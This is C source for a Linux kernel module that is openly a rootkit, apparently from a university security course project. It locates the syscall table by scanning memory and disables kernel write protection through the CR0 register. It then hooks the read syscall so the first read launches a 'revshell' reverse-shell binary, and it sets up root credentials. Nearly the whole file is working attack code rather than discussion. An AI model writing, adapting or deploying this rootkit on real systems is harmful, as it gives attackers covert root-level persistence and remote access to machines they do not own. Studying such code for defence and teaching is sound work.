#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/kallsyms.h>

#define START_ADDR 0xffffffff81000000
#define END_ADDR 0xffffffffa2000000

#define DISABLE_W_PROTECTED_MEMORY \
        do { \
                preempt_disable(); \
                    write_cr0(read_cr0() & (~ 0x10000)); \
                } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
        do { \
                preempt_enable(); \
                    write_cr0(read_cr0() | 0x10000); \
                } while (0);
void** sys_addr;
void** get_systable_addr(void);
void hook_read(void);
asmlinkage ssize_t (*og_read) (int fd, char *buf, size_t count);
int interrupt = 0;
asmlinkage ssize_t evil_read (int, char*, size_t);

int init_module(void)
{
    printk(KERN_INFO "Hello world 1.\n");
    sys_addr = get_systable_addr();
    struct cred *credentials = prepare_creds();    
    credentials->uid.val = credentials->euid.val = 0;
    credentials->gid.val = credentials->egid.val = 0;
    hook_read();
    return 0;
}
void **get_systable_addr(void)
{
    void **stable;
    void *i = (void*) START_ADDR;
    while (i < END_ADDR) {
        stable = (void **) i;
        if (stable[__NR_close] == (void *) sys_close) {
            size_t j;
            const unsigned int SYS_CALL_NUM = 300;
            for (j = 0; j < SYS_CALL_NUM; j ++) {
                if (stable[j] == NULL) {
                    goto skip;
                }
            }
            return stable;
        }
skip:
        ;
        i += sizeof(void *);
    }
    return NULL;
}

void hook_read(){
    DISABLE_W_PROTECTED_MEMORY
    og_read = sys_addr[__NR_read];
    sys_addr[__NR_read] = (void *)evil_read;
    ENABLE_W_PROTECTED_MEMORY
}

asmlinkage ssize_t
evil_read (int fd, char *buf, size_t count){
    printk(KERN_INFO "hacked read 1.\n");
    if(interrupt == 0){
        static char *path = "/home/ub/shared/computer_science_hd/university/m1_cryptis/android_rootkit/Rootkit_x86_64/revshell";
       char *argv[] = { "/home/ub/shared/computer_science_hd/university/m1_cryptis/android_rootkit/Rootkit_x86_64/revshell",NULL }; //Change me
        static char *envp[] =
        { "HOME=/home/ub/shared/computer_science_hd/university/m1_cryptis/android_rootkit/Rootkit_x86_64", "TERM=linux","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin", NULL };
        int ret = call_usermodehelper(path, argv, envp, 1);
        printk(KERN_INFO  "rootkit returned ret :  %i\n", ret);
        interrupt = 1;
    }
    return og_read(fd,buf,count);
}


void cleanup_module(void){
    DISABLE_W_PROTECTED_MEMORY
    sys_addr[__NR_read] = og_read;
    ENABLE_W_PROTECTED_MEMORY
    printk(KERN_INFO "Goodbye world 1.\n");
}
